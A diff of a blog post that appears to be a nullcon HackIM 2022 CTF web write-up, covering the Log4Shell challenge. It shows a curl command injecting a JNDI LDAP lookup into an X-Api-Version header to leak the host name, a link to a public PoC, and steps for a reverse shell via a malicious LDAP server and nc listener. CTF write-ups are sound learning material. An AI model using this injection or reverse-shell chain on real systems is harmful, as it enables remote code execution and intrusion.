@@ -1,7 +1,7 @@
 ---
 layout: single
 title: nullcon HackIM 2022
-excerpt: "log4u - texnology - fil3serv4r writeups[web]"
+excerpt: nullcon HackIM 2022 Web Writeups
 date: 2022-4-11
 classes: wide
 header:
@@ -46,6 +46,12 @@ curl $URL -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.z5wbevl1c0v3t8gxs856
 ```
 ![Screenshot_2022-04-08_21_17_11](https://user-images.githubusercontent.com/45040001/162826208-c584bd56-8411-4d8e-944e-71bc5925fd36.png)
 
+## POC
+[log4j shell poc](https://github.com/kozmer/log4j-shell-poc)
 
-
+## Exploit Steps
+- Generate a reverse shell java class(just modify the poc for forward attack)
+- Upload the reverse shell java class in HTTP Server 
+- Start malicious ldap server giving the HTTP Server URL for redirecting the victim
+- Start nc listener for reverse shell
 ![flag](https://user-images.githubusercontent.com/45040001/162826580-8d33dcae-e97f-4cdc-9679-749646111c9b.png)
